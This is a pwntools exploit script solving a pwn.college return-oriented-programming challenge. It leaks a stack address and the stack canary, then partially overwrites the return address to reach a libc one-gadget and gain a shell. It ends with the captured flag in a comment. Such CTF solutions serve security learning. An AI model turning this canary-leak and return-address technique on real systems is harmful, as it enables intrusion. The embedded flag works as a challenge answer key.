from pwn import *

elf = context.binary = ELF("./babyrop_level13.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")    

libc = ELF("./libc-2.31.so", checksec=False)
rop = ROP([libc])

magic = 0x23b65 # "pop r13", "pop r14", "pop r15", "ret"
io = s.process("/challenge/babyrop_level13.0")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
stack = int(io.recvline().strip()[:-1], 16)
info("Leak stack: " + hex(stack))

io.sendlineafter(b':\n', hex(stack + 72).encode())

io.recvuntil(f'[LEAK] *{hex(stack + 72)} = '.encode())
canary = int(io.recvline(), 16)
info("Leak canary: " + hex(canary))

io.send(b'a'*0x48 + p64(canary) + p64(0) + b'\x65\x3b\x12')
io.interactive()
# Flag: pwn.college{wETWMsAgY9kF2U-fz3bLdpJ_-2v.0FN2MDLxIjNyEzW}